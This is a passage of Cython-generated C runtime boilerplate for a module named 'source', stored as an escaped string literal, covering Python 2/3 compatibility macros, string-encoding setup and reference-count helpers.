8) ? PyDict_New() : _PyDict_NewPresized(n))\n#else\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\n#endif\n#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\n#else\n  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)\n  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_""HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS\n#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\n#else\n#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)\n#endif\n#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)\n  #define CYTHON_PEP393_ENABLED 1\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_READY(op)       (0)\n  #else\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\n  #endif\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\n  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\n  #else\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\n    #else\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\n    #endif\n  #endif\n#else\n  #define CYTHON_PEP393_ENABLED 0\n  #define PyUnicode_1BYTE_KIND  1\n  #define PyUnicode_2BYTE_KIND  2\n  #define PyUnicode_4BYTE_KIND  4\n  #define __Pyx_PyUnicode_READY(op)       (0)\n  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u) ""  ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)\n  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\n#else\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)\n  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)\n  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)\n  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, \"__format__\", \"O\", fmt)\n#endif\n#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)\n#else\n  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)\n#endif\n#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)\n  #define PyObject_ASCII(o)            PyObject_Repr(o)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBaseString_Type            PyUnicod""e_Type\n  #define PyStringObject               PyUnicodeObject\n  #define PyString_Type                PyUnicode_Type\n  #define PyString_Check               PyUnicode_Check\n  #define PyString_CheckExact          PyUnicode_CheckExact\n#ifndef PyObject_Unicode\n  #define PyObject_Unicode             PyObject_Str\n#endif\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)\n  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)\n#else\n  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))\n  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))\n#endif\n#ifndef PySet_CheckExact\n  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)\n#endif\n#if PY_VERSION_HEX >= 0x030900A4\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\n#else\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\n#endif\n#if CYTHON_ASSUME_SAFE_MACROS\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\n#else\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyIntObject                  PyLongObject\n  #define PyInt_Type                   PyLong_Type\n  #define PyInt_Check(op)              PyLong_Check(op)\n  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)\n  #define PyInt_FromString             PyLong_FromString\n  #define PyInt_FromUnicode            PyLong_FromUnicode\n  #define PyInt_FromLong               PyLong_FromLong\n  #define PyInt_FromSize_t             PyLong_FromSize_t\n  #define PyInt_FromSsize_t            PyLong_FromSsize_t\n  #define PyInt_AsLong                 PyLong_AsLong\n  #define PyInt_AS_LONG                PyLong_AS_LONG\n  #define PyInt_AsSsize_t              PyLong_AsSsize_t\n  #define PyInt_AsUnsignedLongMa""sk     PyLong_AsUnsignedLongMask\n  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask\n  #define PyNumber_Int                 PyNumber_Long\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define PyBoolObject                 PyLongObject\n#endif\n#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY\n  #ifndef PyUnicode_InternFromString\n    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\n  #endif\n#endif\n#if PY_VERSION_HEX < 0x030200A4\n  typedef long Py_hash_t;\n  #define __Pyx_PyInt_FromHash_t PyInt_FromLong\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t\n#else\n  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t\n#endif\n#if PY_MAJOR_VERSION >= 3\n  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))\n#else\n  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)\n#endif\n#if CYTHON_USE_ASYNC_SLOTS\n  #if PY_VERSION_HEX >= 0x030500B1\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\n    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)\n  #else\n    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))\n  #endif\n#else\n  #define __Pyx_PyType_AsAsync(obj) NULL\n#endif\n#ifndef __Pyx_PyAsyncMethodsStruct\n    typedef struct {\n        unaryfunc am_await;\n        unaryfunc am_aiter;\n        unaryfunc am_anext;\n    } __Pyx_PyAsyncMethodsStruct;\n#endif\n\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\n  #if !defined(_USE_MATH_DEFINES)\n    #define _USE_MATH_DEFINES\n  #endif\n#endif\n#include <math.h>\n#ifdef NAN\n#define __PYX_NAN() ((float) NAN)\n#else\nstatic CYTHON_INLINE float __PYX_NAN() {\n  float value;\n  memset(&value, 0xFF, sizeof(value));\n  return value;\n}\n#endif\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\n#define __Pyx_truncl trunc\n#else\n#define __Pyx_truncl truncl\n#endif\n\n#define __P""YX_MARK_ERR_POS(f_index, lineno) \\\n    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\n\n#ifndef __PYX_EXTERN_C\n  #ifdef __cplusplus\n    #define __PYX_EXTERN_C extern \"C\"\n  #else\n    #define __PYX_EXTERN_C extern\n  #endif\n#endif\n\n#define __PYX_HAVE__source\n#define __PYX_HAVE_API__source\n/* Early includes */\n#ifdef _OPENMP\n#include <omp.h>\n#endif /* _OPENMP */\n\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\n#define CYTHON_WITHOUT_ASSERTIONS\n#endif\n\ntypedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;\n                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;\n\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)\n#define __PYX_DEFAULT_STRING_ENCODING \"\"\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\n#define __Pyx_long_cast(x) ((long)x)\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py""_ssize_t limit) {\n    return (size_t) i < (size_t) limit;\n}\n#if defined (__cplusplus) && __cplusplus >= 201103L\n    #include <cstdlib>\n    #define __Pyx_sst_abs(value) std::abs(value)\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) abs(value)\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\n    #define __Pyx_sst_abs(value) labs(value)\n#elif defined (_MSC_VER)\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define __Pyx_sst_abs(value) llabs(value)\n#elif defined (__GNUC__)\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\n#else\n    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\n#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\n#if PY_MAJOR_VERSION < 3\n    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#else\n    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize\n#endif\n#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsSString(s)    ((const signed"" char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\n#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\n#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\n#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {\n    const Py_UNICODE *u_end = u;\n    while (*u_end++) ;\n    return (size_t)(u_end - u - 1);\n}\n#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))\n#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\n#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)\n#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);\n#define __Pyx_PySequence_Tuple(obj)\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_""t(size_t);\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\n#if CYTHON_ASSUME_SAFE_MACROS\n#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\n#else\n#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\n#endif\n#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))\n#if PY_MAJOR_VERSION >= 3\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\n#else\n#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))\n#endif\n#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\nstatic int __Pyx_sys_getdefaultencoding_not_ascii;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    PyObject* ascii_chars_u = NULL;\n    PyObject* ascii_chars_b = NULL;\n    const char* default_encoding_c;\n    sys = PyImport_ImportModule(\"sys\");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) \"getdefaultencoding\", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    if (strcmp(default_encoding_c, \"ascii\") == 0) {\n        __Pyx_sys_getdefaultencoding_not_ascii = 0;\n    } else {\n        char ascii_chars[128];\n        int c;\n        for (c = 0; c < 128; c++) {\n            ascii_chars[c] = c;\n        }\n        __Pyx_sys_getdefaultencoding_not_ascii = 1;\n        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);\n        if (!ascii_chars_u) goto bad;\n        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);\n        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {\n            PyErr_For""mat(\n                PyExc_ValueError,\n                \"This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.\",\n                default_encoding_c);\n            goto bad;\n        }\n        Py_DECREF(ascii_chars_u);\n        Py_DECREF(ascii_chars_b);\n    }\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    Py_XDECREF(ascii_chars_u);\n    Py_XDECREF(ascii_chars_b);\n    return -1;\n}\n#endif\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\n#else\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\nstatic char* __PYX_DEFAULT_STRING_ENCODING;\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\n    PyObject* sys;\n    PyObject* default_encoding = NULL;\n    char* default_encoding_c;\n    sys = PyImport_ImportModule(\"sys\");\n    if (!sys) goto bad;\n    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) \"getdefaultencoding\", NULL);\n    Py_DECREF(sys);\n    if (!default_encoding) goto bad;\n    default_encoding_c = PyBytes_AsString(default_encoding);\n    if (!default_encoding_c) goto bad;\n    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);\n    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;\n    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);\n    Py_DECREF(default_encoding);\n    return 0;\nbad:\n    Py_XDECREF(default_encoding);\n    return -1;\n}\n#endif\n#endif\n\n\n/* Test for GCC > 2.95 */\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\n  #define likely(x)   __builtin_expect(!!(x), 1)\n  #define unlikely(x) __builtin_expect(!!(x), 0)\n#else /* !__GNUC__ or GCC < 2.95 */\n  #define likely(x)   (x)\n  #define unlikely""(x) (x)\n#endif /* __GNUC__ */\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }\n\nstatic PyObject *__pyx_m = NULL;\nstatic PyObject *__pyx_d;\nstatic PyObject *__pyx_b;\nstatic PyObject *__pyx_cython_runtime = NULL;\nstatic PyObject *__pyx_empty_tuple;\nstatic PyObject *__pyx_empty_bytes;\nstatic PyObject *__pyx_empty_unicode;\nstatic int __pyx_lineno;\nstatic int __pyx_clineno = 0;\nstatic const char * __pyx_cfilenm= __FILE__;\nstatic const char *__pyx_filename;\n\n\nstatic const char *__pyx_f[] = {\n  \"source.py\",\n};\n\n/*--- Type declarations ---*/\n\n/* --- Runtime support code (head) --- */\n/* Refnanny.proto */\n#ifndef CYTHON_REFNANNY\n  #define CYTHON_REFNANNY 0\n#endif\n#if CYTHON_REFNANNY\n  typedef struct {\n    void (*INCREF)(void*, PyObject*, int);\n    void (*DECREF)(void*, PyObject*, int);\n    void (*GOTREF)(void*, PyObject*, int);\n    void (*GIVEREF)(void*, PyObject*, int);\n    void* (*SetupContext)(const char*, int, const char*);\n    void (*FinishContext)(void**);\n  } __Pyx_RefNannyAPIStruct;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\n#ifdef WITH_THREAD\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          if (acquire_gil) {\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\n              PyGILState_Release(__pyx_gilstate_save);\\\n          } else {\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\n          }\n#else\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\n          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)\n#endif\n  #define __Pyx_RefNannyFinishContext()\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)""\n  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\n  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)\n  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)\n  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)\n  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)\n#else\n  #define __Pyx_RefNannyDeclarations\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\n  #define __Pyx_RefNannyFinishContext()\n  #define __Pyx_INCREF(r) Py_INCREF(r)\n  #define __Pyx_DECREF(r) Py_DECREF(r)\n  #define __Pyx_GOTREF(r)\n  #define __Pyx_GIVEREF(r)\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\n  #define __Pyx_XGOTREF(r)\n  #define __Pyx_XGIVEREF(r)\n#endif\n#define __Pyx_XDECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_XDECREF(tmp);\\\n    } while (0)\n#define __Pyx_DECREF_SET(r, v) do {\\\n        PyObject *tmp = (PyObject *) r;\\\n        r = v; __Pyx_DECREF(tmp);\\\n    } while (0)\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\n\n/* PyObjectGetAttrStr.proto */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\n#else\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\n#endif\n\n/* GetBuiltinName.proto */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\n\n/* Import.proto */\nstatic PyObject *__Pyx_Import(P""yObject *name, PyObject *from_list, int level);\n\n/* PyDictVersioning.proto */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\n    (cache_var) = (value);\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\n        (VAR) = __pyx_dict_cached_value;\\\n    } else {\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\n    }\\\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\n#else\n#define __PYX_GET_DICT_VERSION(dict)  (0)\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\n#endif\n\n/* GetModuleGlobalName.proto */\n#if CYTHON_USE_DICT_VERSIONS\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\n    PY_UINT64_T __pyx_dict_version;\\\n    PyObject *__py""x_dict_cached_value;\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);\n#else\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\n#endif\n\n/* PyCFunctionFastCall.proto */\n#if CYTHON_FAST_PYCCALL\nstatic CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);\n#else\n#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)\n#endif\n\n/* PyFunctionFastCall.proto */\n#if CYTHON_FAST_PYCALL\n#define __Pyx_PyFunction_FastCall(func, 